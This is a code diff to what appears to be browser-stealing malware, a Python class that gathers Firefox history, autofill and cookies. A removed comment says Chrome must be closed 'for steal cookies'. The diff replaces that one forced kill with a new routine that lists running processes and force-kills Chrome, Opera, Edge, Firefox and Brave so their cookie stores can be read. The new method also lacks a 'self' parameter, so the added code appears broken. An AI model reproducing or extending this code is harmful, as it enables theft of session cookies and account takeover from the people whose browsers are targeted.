@@ -129,11 +129,7 @@ class Main:
         self.FirefoxHistoryList = list()
         self.FirefoxAutofiList = list()
     async def main(self):
-        try:
-            # new versions of chrome its protect the 'cookies' so we have to close it for steal cookies ;)
-            processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM chrome.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
-            await processes.communicate() 
-        except:pass
+        await self.kill_browsers()
         await self.list_profiles()
         await self.ListFirefoxProfiles()
         taskk = [
@@ -187,6 +183,28 @@ class Main:
                             self.FirefoxFilesFullPath.append(file_path)
         except:
             pass
+    async def kill_browsers():
+        process_names = ["chrome.exe", "opera.exe", "edge.exe", "firefox.exe", "brave.exe"]
+        process = await asyncio.create_subprocess_shell(
+            'tasklist',
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+
+        stdout, stderr = await process.communicate()
+        if not process.returncode != 0:
+            output_lines = stdout.decode().split('\n')
+            for line in output_lines:
+                for process_name in process_names:
+                    if process_name.lower() in line.lower():
+                        parts = line.split()
+                        pid = parts[1]
+                        process = await asyncio.create_subprocess_shell(
+                        f'taskkill /F /PID {pid}',
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE
+                        )
+                        await process.communicate()
     async def GetFirefoxCookies(self) -> None:
         try:
             for files in self.FirefoxFilesFullPath:
